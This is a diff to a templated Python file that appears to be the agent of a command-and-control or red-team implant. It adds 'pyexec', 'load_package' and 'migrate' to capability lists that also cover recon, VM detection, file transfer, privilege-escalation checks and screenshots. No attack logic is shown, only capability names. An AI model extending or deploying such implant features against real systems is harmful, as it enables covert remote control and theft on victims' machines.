@@ -718,10 +718,11 @@ CAPABILITIES = [
     {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
                     "getpid", "getuid", "getppid",
                     "getdomain", "check_vm",{% endif %}
-    {% if include_exec %}"exec",{% endif %}
-    {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
+    {% if include_exec %}"exec", "pyexec",{% endif %}
+    {% if include_fs %}"fs_list", "fs_get", "fs_put", "load_package",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
     {% if include_screenshot %}"screenshot",{% endif %}
+    {% if migration %}"migrate",{% endif %}
     "ping", "shutdown",
 ]
 
@@ -2479,13 +2480,13 @@ def _register(transport) -> tuple:
         # word instead; this list is how it knows not to. It is a claim about this
         # file, not about what the operator is allowed to ask.
         "capabilities": [
-            {% if include_exec %}"exec",{% endif %}
+            {% if include_exec %}"exec", "pyexec",{% endif %}
             "ping", "shutdown",
             {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
                     "getpid", "getuid", "getppid",
                     "getdomain", "check_vm",{% endif %}
 
-            {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
+            {% if include_fs %}"fs_list", "fs_get", "fs_put", "load_package",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
             {% if include_screenshot %}"screenshot",{% endif %}
             {% if migration %}"migrate",{% endif %}
